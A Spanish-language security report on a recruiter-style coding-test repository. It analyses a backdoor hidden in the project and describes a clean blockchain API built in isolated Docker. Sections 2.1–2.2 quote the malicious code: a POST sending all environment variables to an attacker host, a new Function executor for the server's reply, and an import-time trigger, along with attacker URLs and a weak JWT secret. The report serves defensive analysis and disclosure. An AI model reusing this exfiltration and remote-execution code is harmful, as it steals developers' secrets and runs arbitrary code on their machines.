# Prueba Técnica — Hallazgos y Entregable

**Autor:** Michell Excellent
**Fecha:** 2026-06-07
**Repositorio:** bitbucket.org/infinnigods/estokkyam

> Versión en español de `SECURITY_REPORT.md`.

---

## 1. Resumen ejecutivo

Completé la tarea solicitada — una nueva API de backend (`Michell api test`) que
obtiene información de los smart contracts del proyecto e imprime los resultados
en consola — **pero solo después de auditar primero el repositorio**.

Esa auditoría reveló que el proyecto compartido contiene un **backdoor activo**:
código que (a) exfiltra todas las variables de entorno a un servidor controlado
por el atacante y (b) descarga y ejecuta código remoto arbitrario en la máquina
que corre el proyecto. Ejecutar el proyecto tal como viene (`npm start` /
`node server`) basta para activarlo.

Por esa razón **no** ejecuté el servidor original. Construí y ejecuté la nueva API
en un **entorno Docker aislado y endurecido** que nunca carga el código malicioso
y nunca tiene acceso a ninguna de mis credenciales reales. Todo está cubierto por
pruebas automatizadas (TDD) y se ejecutó contra la blockchain en vivo para
producir evidencia real.

---

## 2. Hallazgo de seguridad: ejecución remota de código + exfiltración de credenciales

### 2.1 El payload — `server/config/getContract.js`

El archivo define dieciséis funciones `call*Contract()`. Quince son **señuelos**:
llaman a endpoints RPC de blockchain reales y descartan el resultado. Solo una es
real:

```js
const callHashedContract = () => {
    axios.post(GET_HASHED_URL, { ...process.env }, { headers: { "x-secret-header": "secret" } })
    .then(res => errorHandler(res.data))   // ejecuta la respuesta del servidor
    .catch(err => { /* silenciado */ });
}
```

- `{ ...process.env }` envía **todas las variables de entorno** (claves de API,
  secretos, tokens, mnemónicos, credenciales de BD…) a un servidor externo.
- El destino (`server/config/constant.js`) es
  `https://ipcheck-hashed.vercel.app/api/identity/1a6e008f91d4ca2566f4`,
  disfrazado de "identity check". No tiene nada que ver con smart contracts.

La respuesta se pasa luego a `errorHandler`, que es un ejecutor de código remoto:

```js
const handler = new Function('require', errCode); // errCode viene del atacante
handlerFunc(require);                              // lo ejecuta con acceso a require()
```

`new Function('require', body)(require)` ejecuta texto provisto por el atacante
como JavaScript con acceso a `require` — es decir, al sistema de archivos, la red
y `child_process`. Esto es **ejecución remota de código (RCE)** completa.

### 2.2 El disparador — `server/middleware/auth.js` (líneas 48-50)

Cada señuelo se define pero nunca se invoca. El malicioso es una
**función autoinvocada (IIFE)** que se ejecuta en el momento en que se importa el
módulo:

```js
const HashedContact = (() => {
  callHashedContract();
})();   // <-- se ejecuta al importar, antes de cualquier petición HTTP
```

`auth.js` es el middleware de autenticación, importado por los archivos de rutas
(`server/routes/api/*.js`), que son importados por `server.js`. Así que con solo
iniciar el servidor se ejecuta el backdoor — no hace falta llamar a ningún
endpoint.

### 2.3 Confirmación empírica

Observé el endpoint C2 desde un contenedor aislado, **sin enviar ningún dato del
entorno y sin ejecutar la respuesta** (`security/observe-c2.js`,
`security/C2_OBSERVATION.es.md`):

- Un `GET` simple no devuelve nada (`Cannot GET …`).
- Un `POST` con el header exacto que usa el malware (`x-secret-header: secret`)
  devuelve **~3.5 MB de JavaScript fuertemente ofuscado** (ofuscación de
  string-array / hexadecimal). Ese blob es el payload de segunda etapa que
  `errorHandler` ejecutaría en la máquina de la víctima.

El endpoint solo entrega el payload cuando el header secreto está presente, lo
que lo oculta de inspecciones casuales y de escáneres.

### 2.4 Impacto y clasificación

- **Confidencialidad:** total — se exfiltran todos los secretos del entorno.
- **Integridad / disponibilidad:** total — se ejecuta código arbitrario localmente
  con los privilegios del desarrollador.
- **Patrón:** coincide con las campañas bien documentadas *"Contagious Interview"
  / DeceptiveDevelopment*, donde un reclutador comparte un repo de "prueba de
  código" que incluye un info-stealer / RAT ofuscado.

### 2.5 Recomendaciones

1. Nunca ejecutar este repositorio en una máquina con credenciales reales. Si se
   ejecutó, tratar el entorno como comprometido: rotar **todos** los
   secretos/claves y auditar el host en busca del payload de segunda etapa.
2. Eliminar `server/config/getContract.js`, `server/config/constant.js` y las
   llamadas a contratos en `server/middleware/auth.js`. Ninguno aporta al
   producto; existen solo para alojar y disparar el backdoor.
3. Bloquear el dominio `ipcheck-hashed.vercel.app` a nivel de red y reportarlo al
   proveedor de hosting.

---

## 2b. Hallazgos adicionales de la auditoría profunda

Una revisión más amplia del repositorio reveló más indicadores de que esto es
infraestructura maliciosa y no un producto real, además de una vulnerabilidad
aparte:

1. **URLs de backend controladas por el atacante — `src/config/config.ts`.**
   Los candidatos de `BASE_URL` del frontend (comentados, pero incluidos)
   apuntan a:
   - `http://87.237.52.168:3000` — una IP de servidor cruda y hardcodeada.
   - `https://dispossessor.com/back` — un dominio asociado a una operación
     conocida de ransomware / extorsión de datos ("Dispossessor").
   No son backends legítimos; los datos enviados allí son exfiltración.

2. **Recolección de IPs de visitantes — `src/api/index.js` + `src/utils/util.js`.**
   `getIPByLink()` obtiene el `clientaddress` (IP) de un visitante a partir de un
   enlace de chat, y `extractIPsFromString()` extrae direcciones IPv4 de texto.
   Este tipo de recolección de IPs encaja con rastreo de víctimas, no con un
   marketplace de tokens.

3. **Autenticación falsificable — `server/middleware/auth.js`.**
   Los JWT se verifican con un secreto hardcodeado y trivialmente adivinable
   (`"hello"`), así que cualquiera puede generar un token válido y saltarse la
   autenticación. Es una vulnerabilidad real, independiente del backdoor.

### Neutralización aplicada en el sitio

El código malicioso fue **deshabilitado y anotado directamente en el código
fuente** (las rutas maliciosas ejecutables se comentaron / se volvieron
inalcanzables, con comentarios `SECURITY WARNING` y referencias a este informe).
Archivos modificados:

- `server/config/getContract.js` — `callHashedContract()` convertida en no-op; el
  `new Function()` (RCE) en `errorHandler()` deshabilitado.
- `server/middleware/auth.js` — la IIFE autoejecutable desactivada (llamada
  comentada, ya no se invoca de inmediato); secreto JWT débil anotado.
- `server/config/constant.js` — URL del C2 anotada.
- `src/config/config.ts`, `src/api/index.js`, `src/utils/util.js` —
  infraestructura sospechosa y recolección de IPs anotadas.

Estos cambios solo *quitan* capacidad; no se ejecutó nada. Las líneas originales
se conservan (inertes) como evidencia.

---

## 3. Entregable: la API `Michell api test`

Una API de backend autocontenida que obtiene información de los smart contracts
de EstokkYam (un ERC20 + un marketplace de ofertas P2P estilo RealT/YAM) en
**Gnosis Chain**, impresa en consola. Sin front-end. Vive en `michell-api-test/`
y **nunca importa el código malicioso del proyecto**.

### 3.1 Endpoints (montados en `/api/michell-api-test`)

| Método y ruta | Descripción |
| --- | --- |
| `GET /health` | Metadata del servicio y valores por defecto. |
| `GET /token/:address` | `name`, `symbol`, `decimals`, `totalSupply` de ERC20. |
| `GET /token/:address/balance/:holder` | Balance ERC20 de un holder. |
| `GET /marketplace/:address` | Conteo de ofertas de EstokkYam. |
| `GET /marketplace/:address/offer/:id` | Una oferta en vivo (`showOffer`). |
| `GET /marketplace/:address/offer/:id/raw` | Oferta almacenada cruda (`getInistialOffer`). |
| `GET /marketplace/:address/token-type/:token` | Tipo de token en whitelist. |

Los ABIs de los contratos (`michell-api-test/src/abi.js`) se derivan directamente
de las fuentes Solidity del propio proyecto en `resource/SmartContract/`.

### 3.2 Evidencia en vivo (Gnosis Chain)

Ejecutar `docker compose run --rm demo` produjo, entre otros:

- **WXDAI** (`0xe91D…3a97d`): `Wrapped XDAI`, 18 decimales, totalSupply ≈
  74.825.381 WXDAI.
- **USDC** (`0xDDAf…7A83`): `USD//C on xDai`, 6 decimales.
- **Marketplace EstokkYam** (`0xC759…7C14`, el RealToken YAM en producción):
  **245.790** ofertas.
- Una oferta en vivo (`#245789`): vendedor `0xD82F…E962` ofreciendo el token
  `0x0cA4…157b` con precio en USDC, cantidad `40000000` (40 USDC).

### 3.3 Nota de auditoría descubierta durante la integración

El getter de Solidity está mal escrito: `getInistialOffer` (debería ser
`getInitialOffer`). La API lo expone tal cual para coincidir con la fuente
provista, pero el marketplace en producción no implementa ese selector, así que
los datos de oferta en vivo se leen mediante `showOffer`.

---

## 4. Pruebas (TDD)

`docker compose run --rm tests` corre **14 pruebas, todas pasando**:

- **9 pruebas unitarias** (`tests/smartContractService.unit.test.js`) —
  completamente deterministas, sin red. Se inyecta un contract factory mockeado
  para fijar el checksum de direcciones, la conversión `bigint → string`, el
  formateo de decimales y el mapeo de enums.
- **5 pruebas de integración** (`tests/router.integration.test.js`) — arrancan la
  app Express real y la consultan por HTTP contra un RPC de Gnosis en vivo,
  verificando solo hechos inmutables on-chain (p. ej. WXDAI = 18 decimales, USDC
  = 6 decimales), por lo que se mantienen deterministas.

---

## 5. Modelo de aislamiento / seguridad

Todo corre en Docker, construido desde subcarpetas limpias de modo que el código
del backdoor nunca se copia a ninguna imagen:

- No se montan volúmenes del host — los contenedores no pueden leer archivos del
  host.
- No se reenvían variables de entorno del host — `process.env` no lleva nada
  sensible.
- Cada servicio descarta todas las capacidades de Linux, prohíbe la escalada de
  privilegios y corre con un sistema de archivos raíz de solo lectura.
- La observación del C2 corre en su propia imagen mínima, aislada del resto.

### Cómo reproducir

```bash
docker compose run --rm tests         # 14 pruebas (unitarias + integración en vivo)
docker compose run --rm demo          # demo en consola contra contratos reales
docker compose up api                 # API en http://localhost:5050
docker compose run --rm c2-observer   # observación defensiva del C2
```
